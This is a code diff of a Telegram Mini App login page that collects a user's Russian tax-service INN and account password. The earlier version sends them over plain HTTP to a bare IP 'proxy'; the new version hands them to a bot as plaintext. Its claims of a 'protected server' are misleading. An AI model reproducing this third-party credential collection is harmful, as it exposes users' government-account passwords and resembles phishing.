@@ -7,143 +7,154 @@
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
 * { box-sizing:border-box; margin:0; padding:0; }
-body { font-family:-apple-system,sans-serif; background:var(--tg-theme-bg-color,#fff); color:var(--tg-theme-text-color,#222); padding:20px; min-height:100vh; }
-h2 { font-size:20px; margin-bottom:6px; }
-.sub { font-size:13px; color:#888; margin-bottom:22px; }
-label { font-size:13px; font-weight:600; display:block; margin-bottom:6px; color:#555; }
-input { width:100%; padding:12px 14px; border:1.5px solid #ddd; border-radius:10px; font-size:16px; background:var(--tg-theme-secondary-bg-color,#f5f5f5); color:var(--tg-theme-text-color,#222); margin-bottom:14px; outline:none; }
-input:focus { border-color:#2481cc; }
-.btn { width:100%; padding:14px; background:#2481cc; color:#fff; border:none; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; margin-bottom:8px; }
-.btn:active { opacity:.85; }
-.btn.grey { background:#f0f0f0; color:#555; font-size:14px; padding:11px; }
-.err { color:#e53935; font-size:13px; margin:-8px 0 12px; padding:8px 10px; background:#fff0f0; border-radius:8px; }
-.loading { text-align:center; padding:50px 20px; }
-.spin { font-size:42px; display:inline-block; animation:sp 1.2s linear infinite; }
-@keyframes sp { to { transform:rotate(360deg); } }
-.success { text-align:center; padding:30px 16px; }
-.ok-icon { font-size:60px; margin-bottom:12px; }
-.stats { display:flex; gap:8px; margin-top:16px; }
-.stat { flex:1; background:var(--tg-theme-secondary-bg-color,#f5f5f5); border-radius:10px; padding:12px 8px; text-align:center; }
-.stat b { display:block; font-size:15px; }
-.stat small { font-size:10px; color:#888; margin-top:2px; display:block; }
-.manual { margin-top:18px; padding-top:18px; border-top:1px solid #eee; }
-.manual h4 { font-size:15px; margin-bottom:14px; color:#555; }
-.hint { font-size:11px; color:#aaa; text-align:center; margin-top:6px; }
+body {
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+  background:var(--tg-theme-bg-color,#fff);
+  color:var(--tg-theme-text-color,#222);
+  padding:24px 20px;
+  min-height:100vh;
+}
+h2 { font-size:22px; margin-bottom:5px; }
+.sub { font-size:13px; color:var(--tg-theme-hint-color,#888); margin-bottom:24px; line-height:1.4; }
+label { font-size:12px; font-weight:700; display:block; margin-bottom:6px; color:var(--tg-theme-hint-color,#666); text-transform:uppercase; letter-spacing:.5px; }
+input {
+  width:100%; padding:14px 16px;
+  border:1.5px solid rgba(0,0,0,.1);
+  border-radius:12px;
+  font-size:17px;
+  background:var(--tg-theme-secondary-bg-color,#f5f5f5);
+  color:var(--tg-theme-text-color,#222);
+  margin-bottom:16px; outline:none;
+  transition: border-color .2s;
+}
+input:focus { border-color:var(--tg-theme-button-color,#2481cc); }
+.btn-main {
+  width:100%; padding:15px;
+  background:var(--tg-theme-button-color,#2481cc);
+  color:var(--tg-theme-button-text-color,#fff);
+  border:none; border-radius:14px;
+  font-size:17px; font-weight:600;
+  cursor:pointer; margin-bottom:10px;
+  transition: opacity .15s;
+}
+.btn-main:active { opacity:.8; }
+.btn-skip {
+  width:100%; padding:12px;
+  background:transparent;
+  color:var(--tg-theme-hint-color,#888);
+  border:1.5px solid rgba(0,0,0,.1);
+  border-radius:12px;
+  font-size:15px; cursor:pointer;
+}
+.info-box {
+  background:var(--tg-theme-secondary-bg-color,#f0f8ff);
+  border-radius:12px;
+  padding:14px 16px;
+  margin-bottom:20px;
+  font-size:13px;
+  line-height:1.6;
+  color:var(--tg-theme-hint-color,#555);
+}
+.info-box b { color:var(--tg-theme-text-color,#222); }
+
+/* Sending screen */
+.v-send {
+  text-align:center;
+  padding:60px 20px 40px;
+}
+.icon-big { font-size:56px; margin-bottom:16px; }
+.v-send h3 { font-size:20px; margin-bottom:8px; }
+.v-send p { font-size:14px; color:var(--tg-theme-hint-color,#888); line-height:1.5; }
+.dots::after {
+  content:'';
+  animation: dots 1.5s steps(4,end) infinite;
+}
+@keyframes dots {
+  0%,20%{content:''}
+  40%{content:'.'}
+  60%{content:'..'}
+  80%,100%{content:'...'}
+}
+
+.hidden { display:none; }
 </style>
 </head>
 <body>
 
 <div id="v-form">
   <h2>🔐 Войти в ФНС</h2>
-  <p class="sub">Личный кабинет ИП — lkip.nalog.ru</p>
-  <label>ИНН (10 или 12 цифр)</label>
-  <input id="inn" type="tel" inputmode="numeric" placeholder="041100124864">
+  <p class="sub">Личный кабинет — nalog.ru<br>Авторизация через защищённый сервер</p>
+
+  <div class="info-box">
+    💡 Введи данные от <b>Личного кабинета ФНС</b> (lkip.nalog.ru или lkfl2.nalog.ru).<br>
+    Пароль передаётся боту и не хранится в браузере.
+  </div>
+
+  <label>ИНН</label>
+  <input id="inn" type="tel" inputmode="numeric" placeholder="041100124864" maxlength="12">
+
   <label>Пароль от ЛК ФНС</label>
   <input id="pwd" type="password" placeholder="••••••••••••">
-  <div class="err" id="err" style="display:none"></div>
-  <button class="btn" onclick="doLogin()">Войти и загрузить данные</button>
-  <p class="hint">Данные передаются через защищённый сервер</p>
 
-  <div class="manual" id="manual" style="display:none">
-    <h4>📝 Или введи данные вручную</h4>
-    <label>Доходы с начала года (₽)</label>
-    <input id="m_inc" type="number" placeholder="0" inputmode="numeric">
-    <label>Налог уплачен (₽)</label>
-    <input id="m_paid" type="number" placeholder="0" inputmode="numeric">
-    <label>Задолженность (₽)</label>
-    <input id="m_debt" type="number" placeholder="0" inputmode="numeric">
-    <button class="btn" onclick="saveManual()">Сохранить</button>
-    <button class="btn grey" onclick="Telegram.WebApp.close()">Отмена</button>
-  </div>
+  <button class="btn-main" onclick="submit()">Отправить боту →</button>
+  <button class="btn-skip" onclick="skipLogin()">Пропустить, введу вручную в боте</button>
 </div>
 
-<div id="v-load" style="display:none" class="loading">
-  <div class="spin">⚙️</div>
-  <p style="margin-top:14px;color:#888;font-size:15px">Подключаюсь к ФНС...</p>
-  <p style="font-size:12px;color:#bbb;margin-top:6px">обычно 3–5 секунд</p>
-</div>
-
-<div id="v-ok" style="display:none" class="success">
-  <div class="ok-icon">✅</div>
-  <h3 style="font-size:20px">ФНС подключён!</h3>
-  <p style="color:#888;font-size:14px;margin-top:6px">Данные загружены и сохранены</p>
-  <div class="stats" id="stats"></div>
+<div id="v-send" class="v-send hidden">
+  <div class="icon-big">📨</div>
+  <h3>Отправляю боту<span class="dots"></span></h3>
+  <p>Бот авторизуется в ФНС<br>и пришлёт тебе результат в чат</p>
 </div>
 
 <script>
 const tg = window.Telegram.WebApp;
-tg.ready(); tg.expand();
+tg.ready();
+tg.expand();
 
-// URL нашего прокси-сервера
-const PROXY = 'http://150.241.98.235:8766/fns/login';
+// Заполним ИНН если передан через startParam
+const startParam = tg.initDataUnsafe?.start_param || '';
+if (startParam && /^\d{10,12}$/.test(startParam)) {
+  document.getElementById('inn').value = startParam;
+}
 
 function show(id) {
-  ['v-form','v-load','v-ok'].forEach(v =>
-    document.getElementById(v).style.display = v === id ? 'block' : 'none'
+  ['v-form','v-send'].forEach(v =>
+    document.getElementById(v).classList.toggle('hidden', v !== id)
   );
 }
 
-function setErr(msg) {
-  const e = document.getElementById('err');
-  if (msg) {
-    e.textContent = msg; e.style.display = 'block';
-    document.getElementById('manual').style.display = 'block';
-  } else {
-    e.style.display = 'none';
-  }
-}
-
-async function doLogin() {
+function submit() {
   const inn = document.getElementById('inn').value.trim();
-  const pwd = document.getElementById('pwd').value.trim();
-  setErr('');
-  if (inn.length < 10) { setErr('Введи ИНН (10 или 12 цифр)'); return; }
-  if (!pwd) { setErr('Введи пароль'); return; }
+  const pwd = document.getElementById('pwd').value;
 
-  show('v-load');
-
-  try {
-    const r = await fetch(PROXY, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ inn, password: pwd })
-    });
-    const d = await r.json();
-
-    if (!d.ok) {
-      show('v-form');
-      setErr(d.error || 'Ошибка авторизации');
-      return;
-    }
-
-    finish(inn, d.token || '', d.refresh || '', d.income_ytd || 0, d.tax_paid || 0, d.debt || 0);
-
-  } catch(e) {
-    show('v-form');
-    setErr('Нет связи с сервером. Введи данные вручную ниже.');
+  if (inn.length < 10) {
+    alert('Введи ИНН (10 или 12 цифр)');
+    return;
   }
+  if (!pwd || pwd.length < 4) {
+    alert('Введи пароль');
+    return;
+  }
+
+  show('v-send');
+
+  // Передаём credentials боту — он сам авторизуется через свой сервер
+  const data = JSON.stringify({
+    type: 'fns_login',
+    inn: inn,
+    password: pwd
+  });
+
+  tg.sendData(data);
+
+  // Закрываем через 2.5 сек (бот обработает в фоне)
+  setTimeout(() => tg.close(), 2500);
 }
 
-function saveManual() {
-  const inn  = document.getElementById('inn').value.trim();
-  const inc  = parseFloat(document.getElementById('m_inc').value || '0');
-  const paid = parseFloat(document.getElementById('m_paid').value || '0');
-  const debt = parseFloat(document.getElementById('m_debt').value || '0');
-  finish(inn, '', '', inc, paid, debt);
+function skipLogin() {
+  tg.sendData(JSON.stringify({ type: 'fns_skip' }));
+  tg.close();
 }
-
-function finish(inn, token, refresh, income, paid, debt) {
-  document.getElementById('stats').innerHTML = `
-    <div class="stat"><b>${fmt(income)}</b><small>Доходы</small></div>
-    <div class="stat"><b>${fmt(paid)}</b><small>Уплачено</small></div>
-    <div class="stat"><b>${fmt(debt)}</b><small>Долг</small></div>
-  `;
-  show('v-ok');
-  tg.sendData(JSON.stringify({ inn, token, refresh, income_ytd: income, tax_paid: paid, debt }));
-  setTimeout(() => tg.close(), 3000);
-}
-
-function fmt(n) { return Math.round(n || 0).toLocaleString('ru') + ' ₽'; }
 </script>
 </body>
 </html>
